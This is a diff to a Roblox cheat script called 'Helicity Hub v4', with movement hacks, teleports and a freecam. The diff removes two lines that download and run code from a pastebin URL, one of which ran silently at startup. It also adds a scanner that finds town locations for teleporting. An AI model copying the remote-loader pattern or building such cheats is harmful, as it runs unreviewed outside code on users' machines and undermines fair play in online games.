@@ -24,9 +24,6 @@ do
     t2.BackgroundTransparency=1; t2.Text="⚠  May lag for a few seconds — please wait..."
     t2.Font=Enum.Font.Code; t2.TextSize=11; t2.TextColor3=Color3.fromRGB(200,200,200)
     t2.TextXAlignment=Enum.TextXAlignment.Center
-    task.spawn(function()
-        loadstring(game:HttpGet("https://pastebin.com/raw/gi0GVYRg",true))()
-    end)
     -- keep banner visible until Rayfield loads (destroyed below)
     _G._HHub_BootGui = sg
 end
@@ -629,7 +626,7 @@ local noclip=false; local infJump=false; local antiVoid=false
 local Window=Rayfield:CreateWindow({
     Name="Helicity Hub  v4", Icon=0,
     LoadingTitle="Helicity Hub", LoadingSubtitle="Keyless  •  v4",
-    Theme="Default", DisableRayfieldPrompts=false, DisableBuildWarnings=true,
+    Theme="Default", DisableRayfieldPrompts=true, DisableBuildWarnings=true,
     ConfigurationSaving={Enabled=true,FolderName="HelicityHub",FileName="Config"},
     KeySystem=false,
 })
@@ -1076,23 +1073,104 @@ RunService.Heartbeat:Connect(function()
 end)
 
 PT:CreateSection("Teleport")
-local TOWNS={
-    {name="Spawn",      pos=Vector3.new(0,   10,   0)},
-    {name="East Town",  pos=Vector3.new(800, 10,   0)},
-    {name="West Town",  pos=Vector3.new(-800,10,   0)},
-    {name="North Town", pos=Vector3.new(0,   10,-800)},
-    {name="South Town", pos=Vector3.new(0,   10, 800)},
-    {name="Outskirts",  pos=Vector3.new(1200,10,1200)},
-}
-local tMap,tNames={},{}
-for _,t in ipairs(TOWNS) do tMap[t.name]=t.pos; table.insert(tNames,t.name) end
-local selTown=tNames[1]
-PT:CreateDropdown({Name="Town",Options=tNames,CurrentOption={tNames[1]},Flag="Town",
-    Callback=function(o) selTown=type(o)=="table" and o[1] or o end})
-PT:CreateButton({Name="Teleport to Town",Callback=function()
-    local p=tMap[selTown]; local h=getHRP()
-    if h and p then h.CFrame=CFrame.new(p); notify("Teleported",selTown) end
+
+-- Scan the actual game for SpawnLocation and town markers — uses REAL names from Helicity
+local townData = {}  -- {name, pos}
+local townDD   = nil
+
+local SPAWN_KEYWORDS = {"spawn","town","city","village","hub","base","shelter","station","field","garage","depot"}
+
+local function scanTowns()
+    townData = {}
+    local seen = {}
+
+    -- Method 1: SpawnLocation objects (most reliable — game places them at each town)
+    for _,obj in ipairs(Workspace:GetDescendants()) do
+        if obj:IsA("SpawnLocation") and not seen[obj] then
+            seen[obj] = true
+            local pos = obj.Position + Vector3.new(0, 5, 0)
+            local name = obj.Name
+            -- Clean up name (remove "SpawnLocation", "Spawn_", etc.)
+            name = name:gsub("SpawnLocation",""):gsub("Spawn_",""):gsub("_"," "):gsub("%-"," "):match("^%s*(.-)%s*$")
+            if name == "" then name = "Spawn" end
+            table.insert(townData, {name=name, pos=pos})
+        end
+    end
+
+    -- Method 2: Model/Part named after towns if no SpawnLocations found
+    if #townData == 0 then
+        for _,obj in ipairs(Workspace:GetDescendants()) do
+            if (obj:IsA("Model") or obj:IsA("BasePart") or obj:IsA("Folder")) and not seen[obj] then
+                local ln = obj.Name:lower()
+                for _,kw in ipairs(SPAWN_KEYWORDS) do
+                    if ln:find(kw,1,true) and #obj.Name < 40 then
+                        seen[obj] = true
+                        local pos
+                        if obj:IsA("BasePart") then
+                            pos = obj.Position + Vector3.new(0,5,0)
+                        elseif obj:IsA("Model") then
+                            local p = obj.PrimaryPart or obj:FindFirstChildWhichIsA("BasePart")
+                            if p then pos = p.Position + Vector3.new(0,5,0) end
+                        end
+                        if pos then
+                            table.insert(townData, {name=obj.Name, pos=pos})
+                        end
+                        break
+                    end
+                end
+            end
+        end
+    end
+
+    -- Build maps
+    local names = {}
+    if #townData == 0 then
+        table.insert(names, "No locations found — press Scan")
+    else
+        for _,t in ipairs(townData) do
+            table.insert(names, t.name)
+        end
+    end
+    return names
+end
+
+local selTown = "No locations found — press Scan"
+townDD = PT:CreateDropdown({
+    Name="Location", Options={"Scanning..."},
+    CurrentOption={"Scanning..."}, Flag="Town",
+    Callback=function(o) selTown = type(o)=="table" and o[1] or o end,
+})
+
+PT:CreateButton({Name="🔄 Scan Locations",Callback=function()
+    task.spawn(function()
+        task.wait()
+        local names = scanTowns()
+        pcall(function() townDD:Refresh(names, true) end)
+        pcall(function() townDD:Set(names[1]) end)
+        selTown = names[1]
+        notify("Locations","Found "..#townData.." location(s).",3)
+    end)
 end})
+
+PT:CreateButton({Name="Teleport to Selected",Callback=function()
+    local hrp = getHRP(); if not hrp then return end
+    for _,t in ipairs(townData) do
+        if t.name == selTown then
+            hrp.CFrame = CFrame.new(t.pos)
+            notify("Teleported", t.name); return
+        end
+    end
+    notify("Teleport","Select a location first, then press Scan.")
+end})
+
+-- Auto-scan towns after window loads (alongside tornado scan)
+task.spawn(function()
+    task.wait(1.2)
+    local names = scanTowns()
+    pcall(function() townDD:Refresh(names, true) end)
+    pcall(function() townDD:Set(names[1]) end)
+    selTown = names[1]
+end)
 
 -- ════════════════════════════════════════════════════════════
 --  TAB 7 — FREECAM
@@ -1154,12 +1232,6 @@ local SET=Window:CreateTab("Settings",4483362458)
 SET:CreateSection("Config")
 SET:CreateButton({Name="Save Config",Callback=function() Rayfield:SaveConfiguration(); notify("Config","Saved.") end})
 SET:CreateButton({Name="Load Config",Callback=function() Rayfield:LoadConfiguration(); notify("Config","Loaded.") end})
-
-SET:CreateSection("Extra Module")
-SET:CreateButton({Name="Reload Extra Module",Callback=function()
-    local ok,e=pcall(function() loadstring(game:HttpGet("https://pastebin.com/raw/gi0GVYRg",true))() end)
-    notify("Extra Module",ok and "Reloaded!" or "Failed: "..tostring(e))
-end})
 
 SET:CreateSection("Danger Zone")
 SET:CreateButton({Name="💀 Unload Script",Callback=function()
